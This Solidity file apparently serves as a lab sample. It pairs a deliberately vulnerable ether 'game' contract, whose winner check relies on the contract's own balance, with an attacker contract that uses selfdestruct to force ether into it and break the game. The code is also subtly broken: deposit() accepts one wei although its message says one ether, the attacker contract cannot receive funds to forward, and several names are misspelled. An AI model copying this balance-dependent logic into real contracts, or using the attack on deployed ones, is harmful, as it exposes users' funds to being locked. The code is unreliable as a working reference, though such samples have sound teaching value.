// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract VulnToSelfdestruct {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1, "Only 1 ther can be sent");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function clainReward() public {
        require(msg.sender == winner, "You are not the winner");

        (bool success, ) = winner.call{value: address(this).balance}("");
        require(success, "Failed to send ehter");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract iAmGonnaGiveYouMoneySeriously {
    function attack(address payable _targetAddress) public {
        selfdestruct(_targetAddress);
    }
}
